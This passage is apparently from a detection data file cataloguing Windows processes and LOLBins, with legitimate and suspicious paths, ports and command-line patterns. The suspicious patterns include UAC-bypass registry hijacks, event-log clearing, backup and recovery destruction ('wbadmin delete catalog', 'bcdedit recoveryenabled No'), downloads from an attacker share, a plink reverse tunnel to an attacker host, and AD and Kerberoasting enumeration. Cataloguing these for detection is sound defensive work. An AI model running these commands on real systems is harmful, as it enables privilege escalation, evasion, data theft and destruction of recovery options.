      ports: ["5985 (HTTP)", "5986 (HTTPS)"],
      protocols: ["HTTP", "HTTPS", "WS-Man"],
      connections: ["Inbound from remote administrators"]
    },
    parentProcesses: {
      legitimate: ["svchost.exe"],
      suspicious: ["cmd.exe", "powershell.exe", "any non-svchost parent"]
    }
  },
  {
    name: "winrs.exe",
    description: "Windows Remote Shell client",
    legitimatePaths: ["C:\\Windows\\System32\\winrs.exe"],
    commonMalwarePaths: ["C:\\Temp\\winrs.exe"],
    notes: "WinRM command-line client for remote command execution. Commonly used in lateral movement. Each invocation runs commands on a remote host.",
    category: "remote",
    networkInfo: {
      ports: ["5985 (HTTP)", "5986 (HTTPS)"],
      protocols: ["HTTP", "HTTPS", "WS-Man"],
      connections: ["Outbound to remote Windows hosts"]
    },
    commandLinePatterns: {
      legitimate: ["winrs.exe -r:server command"],
      suspicious: ["winrs.exe -r:<internal-IP> cmd", "winrs.exe used to run encoded commands"]
    }
  },
  {
    name: "anydesk.exe",
    description: "AnyDesk remote desktop application",
    legitimatePaths: [
      "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe",
      "C:\\Users\\*\\AppData\\Roaming\\AnyDesk\\AnyDesk.exe"
    ],
    commonMalwarePaths: ["C:\\Temp\\anydesk.exe", "C:\\Users\\*\\Downloads\\anydesk.exe"],
    notes: "Legitimate remote desktop tool frequently abused by threat actors for persistent remote access. Often installed post-compromise. Watch for unattended installation flags.",
    category: "remote",
    networkInfo: {
      ports: ["443", "6568", "7070"],
      protocols: ["TCP", "HTTPS"],
      connections: ["AnyDesk relay servers", "Direct connections"]
    },
    commandLinePatterns: {
      legitimate: ["AnyDesk.exe"],
      suspicious: ["AnyDesk.exe --install --silent", "AnyDesk.exe with --set-password", "AnyDesk.exe run from temp directories"]
    }
  },

  // --- UAC Bypass Vectors ---
  {
    name: "wsreset.exe",
    description: "Windows Store reset utility",
    legitimatePaths: ["C:\\Windows\\System32\\wsreset.exe"],
    commonMalwarePaths: ["C:\\Temp\\wsreset.exe"],
    notes: "Auto-elevates without UAC prompt. Known UAC bypass vector — can be abused to execute arbitrary commands with elevated privileges by manipulating registry keys.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["wsreset.exe"],
      suspicious: ["wsreset.exe after HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635ber5p5gdqk2b2ge\\Shell\\open\\command modification"]
    }
  },
  {
    name: "sdclt.exe",
    description: "Windows Backup and Restore utility",
    legitimatePaths: ["C:\\Windows\\System32\\sdclt.exe"],
    commonMalwarePaths: ["C:\\Temp\\sdclt.exe"],
    notes: "Auto-elevates without UAC prompt. UAC bypass vector through HKCU\\Software\\Classes\\Folder\\shell\\open\\command registry hijacking.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["sdclt.exe", "sdclt.exe /blb"],
      suspicious: ["sdclt.exe after registry modification of Folder\\shell\\open\\command"]
    }
  },
  {
    name: "computerdefaults.exe",
    description: "Default Programs configuration utility",
    legitimatePaths: ["C:\\Windows\\System32\\computerdefaults.exe"],
    commonMalwarePaths: ["C:\\Temp\\computerdefaults.exe"],
    notes: "Auto-elevates. UAC bypass vector through delegateexecute registry key manipulation.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["computerdefaults.exe"],
      suspicious: ["computerdefaults.exe after HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command modification"]
    }
  },
  {
    name: "slui.exe",
    description: "Windows Software Licensing UI",
    legitimatePaths: ["C:\\Windows\\System32\\slui.exe"],
    commonMalwarePaths: ["C:\\Temp\\slui.exe"],
    notes: "Auto-elevates. UAC bypass vector through file handler hijacking.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["slui.exe", "slui.exe 3"],
      suspicious: ["slui.exe after HKCU\\Software\\Classes\\exefile\\shell\\open\\command modification"]
    }
  },

  // --- Scripting Engines ---
  {
    name: "python.exe",
    description: "Python interpreter",
    legitimatePaths: [
      "C:\\Python*\\python.exe",
      "C:\\Users\\*\\AppData\\Local\\Programs\\Python\\Python*\\python.exe",
      "C:\\Program Files\\Python*\\python.exe"
    ],
    commonMalwarePaths: ["C:\\Temp\\python.exe", "C:\\Windows\\System32\\python.exe"],
    notes: "Python interpreter. Can execute arbitrary code. Watch for python.exe spawned by Office applications or running encoded/obfuscated scripts.",
    category: "scripting",
    commandLinePatterns: {
      legitimate: ["python.exe script.py", "python.exe -m pip install"],
      suspicious: ["python.exe -c 'import socket...'", "python.exe with base64-encoded commands", "python.exe spawned by Office processes"]
    }
  },
  {
    name: "java.exe",
    description: "Java Runtime Environment launcher",
    legitimatePaths: [
      "C:\\Program Files\\Java\\*\\bin\\java.exe",
      "C:\\Program Files (x86)\\Java\\*\\bin\\java.exe",
      "C:\\Program Files\\Eclipse Adoptium\\*\\bin\\java.exe"
    ],
    commonMalwarePaths: ["C:\\Temp\\java.exe", "C:\\Users\\*\\AppData\\Local\\java.exe"],
    notes: "Java runtime. Historically targeted for exploitation. Watch for java.exe spawning cmd.exe or powershell.exe, which may indicate exploitation or malicious Java application.",
    category: "scripting",
    networkInfo: {
      ports: ["Dynamic", "8080", "8443"],
      protocols: ["TCP", "HTTP", "HTTPS", "RMI"],
      connections: ["Application-specific"]
    },
    commandLinePatterns: {
      legitimate: ["java.exe -jar application.jar", "java.exe -cp classpath MainClass"],
      suspicious: ["java.exe spawning cmd.exe or powershell.exe", "java.exe with -Xbootclasspath manipulation"]
    }
  },

  // --- Missing Windows Core / Recon ---
  {
    name: "gpscript.exe",
    description: "Group Policy script processor",
    legitimatePaths: ["C:\\Windows\\System32\\gpscript.exe"],
    commonMalwarePaths: ["C:\\Temp\\gpscript.exe"],
    notes: "Processes Group Policy startup/shutdown and logon/logoff scripts. Can be abused if attackers gain access to modify Group Policy scripts.",
    category: "system",
    parentProcesses: {
      legitimate: ["svchost.exe"],
      suspicious: ["cmd.exe", "powershell.exe"]
    }
  },
  {
    name: "gpupdate.exe",
    description: "Group Policy update utility",
    legitimatePaths: ["C:\\Windows\\System32\\gpupdate.exe"],
    commonMalwarePaths: ["C:\\Temp\\gpupdate.exe"],
    notes: "Forces Group Policy refresh. If run by an attacker after modifying GPOs, it applies malicious policy changes immediately.",
    category: "admin",
    commandLinePatterns: {
      legitimate: ["gpupdate.exe", "gpupdate.exe /force"],
      suspicious: ["gpupdate.exe run by unusual parents", "gpupdate.exe after suspicious GPO modifications"]
    }
  },
  {
    name: "eventvwr.exe",
    description: "Event Viewer application",
    legitimatePaths: ["C:\\Windows\\System32\\eventvwr.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\eventvwr.exe", "C:\\Temp\\eventvwr.exe"],
    notes: "Auto-elevates. Known UAC bypass vector through mscfile registry hijacking (HKCU\\Software\\Classes\\mscfile\\shell\\open\\command). Distinct from eventvwr.msc snap-in.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["eventvwr.exe", "eventvwr.exe /l:logfile.evtx"],
      suspicious: ["eventvwr.exe after mscfile registry key modification"]
    }
  },

  // --- Core System (additional) ---
  {
    name: "ctfmon.exe",
    description: "CTF Loader - manages text input and handwriting recognition",
    legitimatePaths: ["C:\\Windows\\System32\\ctfmon.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\ctfmon.exe", "C:\\Temp\\ctfmon.exe"],
    notes: "Runs per user session, auto-starts via HKCU Run key. Legitimate instance lives only in System32. Commonly faked by malware for persistence due to its innocuous appearance.",
    category: "system",
    commandLinePatterns: {
      legitimate: ["ctfmon.exe"],
      suspicious: ["ctfmon.exe from non-System32 path", "ctfmon.exe with command-line arguments"]
    }
  },
  {
    name: "lsaiso.exe",
    description: "LSA Isolated - Credential Guard isolated LSA process",
    legitimatePaths: ["C:\\Windows\\System32\\lsaiso.exe"],
    commonMalwarePaths: [],
    notes: "Only present when Credential Guard (VBS) is enabled. Runs in isolated VM context, protecting credentials from lsass memory reads. Its absence on systems claiming Credential Guard support is a red flag.",
    category: "system",
    commandLinePatterns: {
      legitimate: ["lsaiso.exe"],
      suspicious: ["Any instance outside System32", "Running without VBS/Credential Guard active"]
    }
  },
  {
    name: "SecurityHealthService.exe",
    description: "Windows Security Health Service - monitors security component health",
    legitimatePaths: ["C:\\Windows\\System32\\SecurityHealthService.exe"],
    commonMalwarePaths: ["C:\\Temp\\SecurityHealthService.exe"],
    notes: "Backs the Windows Security app. Malware may attempt to terminate or impersonate this process to suppress Defender alerts.",
    category: "system",
    commandLinePatterns: {
      legitimate: ["SecurityHealthService.exe"],
      suspicious: ["SecurityHealthService.exe outside System32"]
    }
  },
  {
    name: "SecurityHealthSystray.exe",
    description: "Windows Security system tray notification process",
    legitimatePaths: ["C:\\Windows\\System32\\SecurityHealthSystray.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\SecurityHealthSystray.exe"],
    notes: "Tray icon for Windows Security. Per-user process. Should always originate from System32.",
    category: "system",
    commandLinePatterns: {
      legitimate: ["SecurityHealthSystray.exe"],
      suspicious: ["SecurityHealthSystray.exe from non-System32 path"]
    }
  },
  {
    name: "ApplicationFrameHost.exe",
    description: "Application Frame Host - container for UWP/modern apps",
    legitimatePaths: ["C:\\Windows\\System32\\ApplicationFrameHost.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\ApplicationFrameHost.exe"],
    notes: "Hosts modern UWP apps within a frame. Should be parented by svchost.exe. Unexpected child processes or non-System32 instances are suspicious.",
    category: "system",
    commandLinePatterns: {
      legitimate: ["ApplicationFrameHost.exe"],
      suspicious: ["ApplicationFrameHost.exe spawning cmd.exe or powershell.exe"]
    }
  },
  {
    name: "TextInputHost.exe",
    description: "Text Input Host - modern touch keyboard and input panel",
    legitimatePaths: ["C:\\Windows\\SystemApps\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\TextInputHost.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\TextInputHost.exe"],
    notes: "Handles on-screen keyboard and ink input. Only valid in the CBS SystemApps path. Per-user process.",
    category: "system",
    commandLinePatterns: {
      legitimate: ["TextInputHost.exe"],
      suspicious: ["TextInputHost.exe outside SystemApps path"]
    }
  },
  {
    name: "SettingSyncHost.exe",
    description: "Settings Sync Host - syncs Windows settings via Microsoft account",
    legitimatePaths: ["C:\\Windows\\System32\\SettingSyncHost.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\SettingSyncHost.exe"],
    notes: "Runs intermittently when settings sync is active. Excessive execution or network activity outside expected Microsoft endpoints is notable.",
    category: "system",
    commandLinePatterns: {
      legitimate: ["SettingSyncHost.exe"],
      suspicious: ["SettingSyncHost.exe with unusual network destinations"]
    }
  },
  {
    name: "WmiApSrv.exe",
    description: "WMI Performance Adapter - provides performance data to WMI consumers",
    legitimatePaths: ["C:\\Windows\\System32\\wbem\\WmiApSrv.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\WmiApSrv.exe", "C:\\Temp\\WmiApSrv.exe"],
    notes: "Short-lived process started on demand by WMI. Only valid in the wbem subdirectory. Persistent execution or unusual parents warrant investigation.",
    category: "system",
    commandLinePatterns: {
      legitimate: ["WmiApSrv.exe"],
      suspicious: ["WmiApSrv.exe outside wbem directory"]
    }
  },

  // --- LOLBins (additional) ---
  {
    name: "wevtutil.exe",
    description: "Windows Event Utility - query, export, and clear event logs",
    legitimatePaths: ["C:\\Windows\\System32\\wevtutil.exe"],
    commonMalwarePaths: ["C:\\Temp\\wevtutil.exe"],
    notes: "Primary tool for clearing Windows event logs (T1070.001). `wevtutil cl Security` and `wevtutil cl System` are near-universal ransomware and APT cleanup steps. Log clearing should trigger immediate investigation.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["wevtutil qe System", "wevtutil gl Security", "wevtutil epl Application backup.evtx"],
      suspicious: ["wevtutil cl Security", "wevtutil cl System", "wevtutil cl Application", "wevtutil sl /e:false"]
    }
  },
  {
    name: "bcdedit.exe",
    description: "Boot Configuration Data editor",
    legitimatePaths: ["C:\\Windows\\System32\\bcdedit.exe"],
    commonMalwarePaths: ["C:\\Temp\\bcdedit.exe"],
    notes: "Modifies boot configuration. Ransomware routinely runs `bcdedit /set {default} recoveryenabled No` and `bcdedit /set {default} bootstatuspolicy ignoreallfailures` to disable recovery (T1490).",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["bcdedit /enum", "bcdedit /set {bootmgr} path \\EFI\\..."],
      suspicious: [
        "bcdedit /set {default} recoveryenabled No",
        "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
        "bcdedit /deletevalue"
      ]
    }
  },
  {
    name: "diskshadow.exe",
    description: "Disk Shadow - Volume Shadow Copy management utility",
    legitimatePaths: ["C:\\Windows\\System32\\diskshadow.exe"],
    commonMalwarePaths: ["C:\\Temp\\diskshadow.exe"],
    notes: "Can expose VSS snapshots as drive letters, enabling NTDS.dit extraction without locking the live database (T1003.003). Supports script mode (`diskshadow /s script.txt`) allowing full automation. Used by APT groups including FIN8.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["diskshadow /l logfile.txt"],
      suspicious: [
        "diskshadow /s <script>",
        "diskshadow exec commands accessing NTDS.dit or SYSTEM hive",
        "diskshadow add volume / expose / exec sequence"
      ]
    }
  },
  {
    name: "wbadmin.exe",
    description: "Windows Backup Admin - manages Windows Server Backup and recovery",
    legitimatePaths: ["C:\\Windows\\System32\\wbadmin.exe"],
    commonMalwarePaths: ["C:\\Temp\\wbadmin.exe"],
    notes: "Ransomware uses `wbadmin delete catalog -quiet` to destroy backup catalogs (T1490), pairing it with vssadmin and bcdedit to eliminate recovery options. Legitimate use is restricted to administrators.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["wbadmin start backup", "wbadmin get versions"],
      suspicious: ["wbadmin delete catalog -quiet", "wbadmin delete systemstatebackup"]
    }
  },
  {
    name: "odbcconf.exe",
    description: "ODBC Configuration utility - configures ODBC drivers and data sources",
    legitimatePaths: ["C:\\Windows\\System32\\odbcconf.exe", "C:\\Windows\\SysWOW64\\odbcconf.exe"],
    commonMalwarePaths: ["C:\\Temp\\odbcconf.exe"],
    notes: "LOLBin: `odbcconf.exe /a {REGSVR <dll>}` loads an arbitrary DLL via the REGSVR action, bypassing application whitelisting (T1218.008). The DLL does not need to be a real ODBC driver.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["odbcconf.exe /S /A {CONFIGSYSDSN ...}"],
      suspicious: ["odbcconf.exe /a {REGSVR <arbitrary.dll>}", "odbcconf.exe /f <rsp_file>"]
    }
  },
  {
    name: "csc.exe",
    description: "C# Compiler - part of the .NET Framework",
    legitimatePaths: [
      "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe",
      "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
    ],
    commonMalwarePaths: ["C:\\Temp\\csc.exe"],
    notes: "LOLBin: compiles C# source to executable or DLL on the fly (T1127). Attackers drop a `.cs` source file and compile it locally to avoid delivering a binary. Often paired with `installutil.exe` or `regsvr32.exe` to execute the result.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["csc.exe /out:app.exe source.cs"],
      suspicious: [
        "csc.exe compiling files from Temp or AppData",
        "csc.exe /out:<temp_path> followed immediately by execution"
      ]
    }
  },
  {
    name: "vbc.exe",
    description: "Visual Basic .NET Compiler - part of the .NET Framework",
    legitimatePaths: [
      "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe",
      "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\vbc.exe"
    ],
    commonMalwarePaths: ["C:\\Temp\\vbc.exe"],
    notes: "LOLBin: same compile-and-execute technique as csc.exe but for VB.NET. Used in fileless attacks where payload is compiled in memory or from a temp source file.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["vbc.exe /out:app.exe source.vb"],
      suspicious: ["vbc.exe compiling from Temp or AppData paths"]
    }
  },
  {
    name: "makecab.exe",
    description: "Cabinet file creation utility",
    legitimatePaths: ["C:\\Windows\\System32\\makecab.exe"],
    commonMalwarePaths: ["C:\\Temp\\makecab.exe"],
    notes: "LOLBin: used by attackers to compress and stage data for exfiltration (T1560.001). Creates `.cab` archives silently. Legitimate use is rare outside OS servicing.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["makecab source.dll output.cab"],
      suspicious: [
        "makecab archiving files from sensitive directories",
        "makecab output to web-accessible or temp paths"
      ]
    }
  },
  {
    name: "ftp.exe",
    description: "Built-in FTP client",
    legitimatePaths: ["C:\\Windows\\System32\\ftp.exe"],
    commonMalwarePaths: ["C:\\Temp\\ftp.exe"],
    notes: "LOLBin: can download files non-interactively via a script file (`ftp -s:script.txt`), bypassing some proxy controls (T1105). Legitimate interactive FTP is rare in modern environments; any scripted use is highly suspicious.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["ftp <host>"],
      suspicious: ["ftp -s:<script_file>", "ftp -n -s: downloading payloads from external IPs"]
    }
  },
  {
    name: "tftp.exe",
    description: "Trivial FTP client - transfers files via TFTP",
    legitimatePaths: ["C:\\Windows\\System32\\tftp.exe"],
    commonMalwarePaths: ["C:\\Temp\\tftp.exe"],
    notes: "LOLBin: historically used by worms and malware to download second-stage payloads (T1105). TFTP uses UDP/69 and bypasses many HTTP proxies. Virtually no legitimate user-facing use on modern Windows.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["tftp -i <host> GET file.bin"],
      suspicious: ["Any tftp.exe execution outside imaging/PXE boot infrastructure"]
    }
  },
  {
    name: "replace.exe",
    description: "File replacement utility - replaces files in a target directory",
    legitimatePaths: ["C:\\Windows\\System32\\replace.exe"],
    commonMalwarePaths: ["C:\\Temp\\replace.exe"],
    notes: "LOLBin: can copy files from a UNC path to a local directory (`replace.exe \\\\attacker\\share\\payload.exe C:\\target /A`), functioning as a download primitive that evades some controls (T1105).",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["replace.exe source.dll C:\\Windows\\System32"],
      suspicious: ["replace.exe sourcing files from UNC/remote paths", "replace.exe /A adding new files from attacker-controlled shares"]
    }
  },
  {
    name: "msconfig.exe",
    description: "System Configuration utility - manages startup programs and services",
    legitimatePaths: ["C:\\Windows\\System32\\msconfig.exe"],
    commonMalwarePaths: ["C:\\Temp\\msconfig.exe"],
    notes: "UAC bypass target via DLL search order hijacking. Attackers may also read its output to understand what security tools start at boot. Spawning cmd.exe or powershell.exe as a child is not expected.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["msconfig.exe"],
      suspicious: ["msconfig.exe spawning unexpected child processes"]
    }
  },
  {
    name: "sysprep.exe",
    description: "System Preparation Tool - generalizes Windows images for deployment",
    legitimatePaths: ["C:\\Windows\\System32\\Sysprep\\sysprep.exe"],
    commonMalwarePaths: ["C:\\Temp\\sysprep.exe"],
    notes: "Classic UAC bypass vector via DLL hijacking (cryptbase.dll / CRYPTSP.dll loaded from the Sysprep directory). Auto-elevates without a UAC prompt. Rarely runs in normal operation outside image deployment.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["sysprep.exe /generalize /oobe /shutdown"],
      suspicious: ["sysprep.exe executed by non-admin user or from unexpected parent", "sysprep.exe without /generalize in non-deployment context"]
    }
  },
  {
    name: "sdbinst.exe",
    description: "Application Compatibility Database Installer",
    legitimatePaths: ["C:\\Windows\\System32\\sdbinst.exe"],
    commonMalwarePaths: ["C:\\Temp\\sdbinst.exe"],
    notes: "Installs shim databases that intercept API calls from target processes (T1546.011). Attackers create custom SDB files that redirect or hook APIs in legitimate executables, achieving persistent code injection without modifying the target binary.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["sdbinst.exe <compatibility.sdb>"],
      suspicious: ["sdbinst.exe installing unsigned or unknown SDB files", "sdbinst.exe run by non-SYSTEM account"]
    }
  },
  {
    name: "dfsvc.exe",
    description: "ClickOnce Application Deployment Service",
    legitimatePaths: ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\dfsvc.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\dfsvc.exe"],
    commonMalwarePaths: ["C:\\Temp\\dfsvc.exe"],
    notes: "LOLBin: executes ClickOnce applications referenced by a URL or `.application` manifest (T1218). Can download and run arbitrary .NET assemblies from attacker-controlled servers. Often invoked via `rundll32.exe dfshim.dll,ShOpenVerbApplication`.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["dfsvc.exe (launched via ClickOnce manifest)"],
      suspicious: ["dfsvc.exe launched from script or shell", "dfsvc.exe fetching manifests from external IPs"]
    }
  },

  // --- Network / Recon ---
  {
    name: "arp.exe",
    description: "ARP cache utility - displays and modifies the ARP table",
    legitimatePaths: ["C:\\Windows\\System32\\arp.exe"],
    commonMalwarePaths: [],
    notes: "Used in host discovery and lateral movement preparation (T1018, T1040). `arp -a` reveals recently contacted hosts on the local subnet. Execution by non-admin scripts or automation tools is worth noting.",
    category: "recon",
    commandLinePatterns: {
      legitimate: ["arp -a", "arp -s <ip> <mac>"],
      suspicious: ["arp -a piped to file or remote share", "arp executed in bulk from automation scripts"]
    }
  },
  {
    name: "nbtstat.exe",
    description: "NetBIOS statistics utility - displays NetBIOS names and sessions",
    legitimatePaths: ["C:\\Windows\\System32\\nbtstat.exe"],
    commonMalwarePaths: [],
    notes: "Used for NetBIOS-based host and user enumeration (T1016, T1087). `nbtstat -A <ip>` resolves hostnames and logged-on users. Common in manual lateral movement and older malware recon phases.",
    category: "recon",
    commandLinePatterns: {
      legitimate: ["nbtstat -n", "nbtstat -s"],
      suspicious: ["nbtstat -A scanning multiple IPs in sequence", "nbtstat output redirected to file"]
    }
  },
  {
    name: "systeminfo.exe",
    description: "System Information utility - displays detailed OS and hardware configuration",
    legitimatePaths: ["C:\\Windows\\System32\\systeminfo.exe"],
    commonMalwarePaths: ["C:\\Temp\\systeminfo.exe"],
    notes: "Extremely common in post-exploitation for host fingerprinting (T1082). Reveals OS version, patch level, hotfixes, domain membership, and hardware. Nearly universal in manual attacker playbooks and automated implant check-in routines.",
    category: "recon",
    commandLinePatterns: {
      legitimate: ["systeminfo.exe", "systeminfo /s <remote_host>"],
      suspicious: ["systeminfo output redirected to file for exfiltration", "systeminfo run by scripting engine or service"]
    }
  },
  {
    name: "qwinsta.exe",
    description: "Query session utility - lists active RDP and terminal sessions",
    legitimatePaths: ["C:\\Windows\\System32\\qwinsta.exe"],
    commonMalwarePaths: [],
    notes: "Used to enumerate logged-on users and active RDP sessions for lateral movement targeting (T1049, T1087). Alias: `query session`. Execution from a non-interactive context or scripting engine is suspicious.",
    category: "recon",
    commandLinePatterns: {
      legitimate: ["qwinsta", "qwinsta /server:<host>"],
      suspicious: ["qwinsta in loop across multiple hosts", "qwinsta run by cmd.exe or powershell.exe from malware context"]
    }
  },
  {
    name: "nltest.exe",
    description: "Network Location Test utility - queries domain trust and DC information",
    legitimatePaths: ["C:\\Windows\\System32\\nltest.exe"],
    commonMalwarePaths: ["C:\\Temp\\nltest.exe"],
    notes: "High-value recon tool (T1482, T1087.002). `nltest /domain_trusts` enumerates all domain trusts for lateral movement planning. `nltest /dclist:<domain>` finds domain controllers. Extremely common in early post-exploitation by both human operators and automated implants.",
    category: "recon",
    commandLinePatterns: {
      legitimate: ["nltest /sc_verify:<domain>", "nltest /dsgetdc:<domain>"],
      suspicious: [
        "nltest /domain_trusts",
        "nltest /dclist:<domain>",
        "nltest /user:<username>",
        "nltest run by non-IT user or scripting engine"
      ]
    }
  },
  {
    name: "klist.exe",
    description: "Kerberos ticket listing utility",
    legitimatePaths: ["C:\\Windows\\System32\\klist.exe"],
    commonMalwarePaths: [],
    notes: "Displays cached Kerberos tickets (T1558). Used by attackers to verify ticket injection success (Pass-the-Ticket, Golden Ticket) and to identify service tickets for analysis. `klist tickets` is the primary recon command.",
    category: "recon",
    commandLinePatterns: {
      legitimate: ["klist", "klist tickets", "klist purge"],
      suspicious: ["klist run from non-interactive shell", "klist immediately after mimikatz or ticket injection"]
    }
  },
  {
    name: "setspn.exe",
    description: "Service Principal Name utility - manages SPN registrations in Active Directory",
    legitimatePaths: ["C:\\Windows\\System32\\setspn.exe"],
    commonMalwarePaths: [],
    notes: "Used for Kerberoasting recon (T1558.003). `setspn -Q */*` or `setspn -T <domain> -Q */*` enumerates all SPNs in the domain, identifying service accounts whose Kerberos tickets can be requested and cracked offline.",
    category: "recon",
    commandLinePatterns: {
      legitimate: ["setspn -A MSSQLSvc/host:1433 DOMAIN\\svcaccount", "setspn -L <account>"],
      suspicious: ["setspn -Q */*", "setspn -T <domain> -Q */*", "setspn enumeration by non-admin user"]
    }
  },

  // --- Admin / AD Tools ---
  {
    name: "dsquery.exe",
    description: "Directory Service Query - queries Active Directory objects",
    legitimatePaths: ["C:\\Windows\\System32\\dsquery.exe"],
    commonMalwarePaths: ["C:\\Temp\\dsquery.exe"],
    notes: "AD enumeration tool (T1087.002, T1069.002). Common attacker commands: `dsquery user -limit 0`, `dsquery computer`, `dsquery group`. Outputs LDAP distinguished names piped to dsget for detailed attributes.",
    category: "admin",
    commandLinePatterns: {
      legitimate: ["dsquery user -name admin*", "dsquery computer -loc \"OU=Servers,...\""],
      suspicious: [
        "dsquery user -limit 0 (dump all users)",
        "dsquery * -filter (objectClass=*) -limit 0",
        "dsquery run by non-IT accounts"
      ]
    }
  },
  {
    name: "dsget.exe",
    description: "Directory Service Get - retrieves attributes of AD objects",
    legitimatePaths: ["C:\\Windows\\System32\\dsget.exe"],
    commonMalwarePaths: [],
    notes: "Paired with dsquery to retrieve user, group, and computer details from AD (T1087.002). `dsget user <DN> -memberof -expand` reveals all group memberships including nested groups.",
    category: "admin",
    commandLinePatterns: {
      legitimate: ["dsget user <DN> -email -tel"],
      suspicious: ["dsget user <DN> -memberof -expand piped to file", "bulk dsget across all domain users"]
    }
  },
  {
    name: "gpresult.exe",
    description: "Group Policy Result - displays applied Group Policy settings",
    legitimatePaths: ["C:\\Windows\\System32\\gpresult.exe"],
    commonMalwarePaths: [],
    notes: "Reveals applied GPOs, security settings, and software restrictions (T1615). Attackers use `gpresult /z` or `/r` to understand policy controls before attempting bypasses or to identify exploitable GPO configurations.",
    category: "admin",
    commandLinePatterns: {
      legitimate: ["gpresult /r", "gpresult /h report.html"],
      suspicious: ["gpresult /z output to file", "gpresult /scope computer run by non-admin"]
    }
  },
  {
    name: "wbemtest.exe",
    description: "WMI Test utility - interactive WMI query and browsing tool",
    legitimatePaths: ["C:\\Windows\\System32\\wbem\\wbemtest.exe"],
    commonMalwarePaths: [],
    notes: "GUI tool for executing arbitrary WMI queries and methods. Can be used to create WMI subscriptions for persistence (T1546.003) or to execute remote commands. Rarely used legitimately outside of WMI troubleshooting.",
    category: "admin",
    commandLinePatterns: {
      legitimate: ["wbemtest.exe"],
      suspicious: ["wbemtest.exe run non-interactively", "wbemtest.exe by scripting engine"]
    }
  },
  {
    name: "ldifde.exe",
    description: "LDIF Directory Exchange - imports/exports AD data in LDIF format",
    legitimatePaths: ["C:\\Windows\\System32\\ldifde.exe"],
    commonMalwarePaths: ["C:\\Temp\\ldifde.exe"],
    notes: "Can dump entire AD subtrees to an LDIF file (T1003.003, T1087.002). `ldifde -f output.ldf -s <DC>` exports all objects and attributes. Rarely run outside of AD migrations; execution in production deserves scrutiny.",
    category: "admin",
    commandLinePatterns: {
      legitimate: ["ldifde -i -f import.ldf", "ldifde -f export.ldf -d \"OU=Users,...\""],
      suspicious: ["ldifde -f <file> with broad or root base DN", "ldifde output to temp or user-writable path"]
    }
  },
  {
    name: "csvde.exe",
    description: "CSV Directory Exchange - imports/exports AD data in CSV format",
    legitimatePaths: ["C:\\Windows\\System32\\csvde.exe"],
    commonMalwarePaths: ["C:\\Temp\\csvde.exe"],
    notes: "Similar to ldifde but CSV output. Used to export user accounts, groups, and attributes for offline analysis. Any export of the full user list or password-related attributes is a data exfiltration concern (T1087.002).",
    category: "admin",
    commandLinePatterns: {
      legitimate: ["csvde -f users.csv -d \"OU=Users,...\""],
      suspicious: ["csvde -f output with domain root base DN", "csvde run by non-admin or service account"]
    }
  },

  // --- Remote Access ---
  {
    name: "putty.exe",
    description: "PuTTY SSH/Telnet client",
    legitimatePaths: [
      "C:\\Program Files\\PuTTY\\putty.exe",
      "C:\\Program Files (x86)\\PuTTY\\putty.exe",
      "C:\\Users\\*\\Downloads\\putty.exe"
    ],
    commonMalwarePaths: ["C:\\Temp\\putty.exe", "C:\\Users\\*\\AppData\\Local\\putty.exe"],
    notes: "Legitimate SSH client commonly used by IT. Also frequently used by attackers for lateral movement and tunneling (T1021.004). Trojanized PuTTY builds (e.g., used in Lazarus Group campaigns) have been distributed via supply chain attacks.",
    category: "remote",
    commandLinePatterns: {
      legitimate: ["putty.exe -ssh user@host", "putty.exe -load <session>"],
      suspicious: ["putty.exe from Temp or AppData", "putty.exe with -proxycmd for tunneling", "unsigned or unexpected hash"]
    }
  },
  {
    name: "plink.exe",
    description: "PuTTY Link - command-line SSH/tunnel client",
    legitimatePaths: [
      "C:\\Program Files\\PuTTY\\plink.exe",
      "C:\\Program Files (x86)\\PuTTY\\plink.exe"
    ],
    commonMalwarePaths: ["C:\\Temp\\plink.exe", "C:\\Users\\*\\AppData\\Local\\plink.exe"],
    notes: "CLI companion to PuTTY. Commonly abused for SSH tunneling and port forwarding (T1572). Attackers use `plink.exe -R <port>:localhost:<port> user@attacker` to create reverse tunnels for C2. Runs headlessly, making it ideal for automated abuse.",
    category: "remote",
    commandLinePatterns: {
      legitimate: ["plink.exe user@host -batch -pw <pass>"],
      suspicious: [
        "plink.exe -R <remote_port>:localhost:<local_port> (reverse tunnel)",
        "plink.exe -L (local port forward to internal services)",
